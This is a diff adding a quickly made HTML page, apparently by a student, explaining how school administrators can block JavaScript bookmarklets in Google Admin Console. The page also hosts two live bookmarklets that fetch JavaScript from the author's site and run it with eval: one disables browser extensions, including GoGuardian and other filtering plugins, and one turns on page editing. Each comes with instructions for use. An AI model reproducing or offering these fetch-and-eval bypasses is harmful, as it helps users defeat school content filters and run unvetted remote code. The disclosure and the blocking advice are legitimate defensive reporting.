@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bookmarklet Info</title>
+</head>
+
+<body>
+    <h1>Bookmarlet information</h1>
+    <p>
+        <br> it relies on google drive allowing you to search for any
+        Bookmarklets are pieces of javascript that are ran as a bookmark,
+        <br> the main way to fix this type of bypass is to take the following
+        <br> steps on the districts Google Admin Console:
+        <ol>
+            <li>Sign in to Google Admin Console</li>
+            <li>Go to <a href="https://admin.google.com/ac/chrome/settings/user">Devices > Chrome > Settings</a>.</li>
+            <li>Select the OU group the students are in on the left</li>
+            <li>Scroll to <b>URL blocking</b>.</li>
+            <li>Add the line <i>javascript://*</i></li>
+        </ol>
+
+        The blocking information was sourced from: <a href="https://xfanatical.com/blog/block-student-bookmarklets">Xfanatical</a>
+        <br>
+        <br> Some popular bookmarklets are below. These are hosted on 
+        <br> this site for the use of reporting them and will not be
+        <br> shared. To use these bookmarklets, drag them to your 
+        <br> bookmarks and follow the instructions next to them.
+        <ul>
+            <li><a href="javascript:fetch(`https://kevintopete.com/bypass/bookmarklets/js/disable_extensions.js`).then(data=>{data.text().then(text=>{eval(text)})});">Disable extensions</a>, to use this drag it to your bookmarks and go to chrome webstore,
+                once there click it.</li>
+            <li><a href="javascript:fetch(`https://kevintopete.com/bypass/bookmarklets/js/enable_page_editing.js`).then(data=>{data.text().then(text=>{eval(text)})});">Enable page editing</a>, to use drag it to your bookmarks and click on it on any page.
+                This will enable creation mode on the browser.</li>
+        </ul>
+
+        The disable extensions bookmarklet is especially dangerous as it 
+        <br> allows disabling of Goguardian and the other filtering plugins. 
+        <br> This particular bookmarlet is already being looked at by 
+        <br> Goguardian and Google respectively.
+        <br> Any questions that you may have you may contact me at:
+        <ul>
+            <li>School Email: kjtopete@gilbertschools.net</li>
+            <li>Personal Email: me@kevintopete.com</li>
+        </ul>
+
+        p.s sorry for lack of any styling on the page, this was spun up very quickly :)
+        <br>
+        <br> <a href="https://kevintopete.com/bypass/">Return to bypasses page</a>
+    </p>
+</body>
+
+</html>
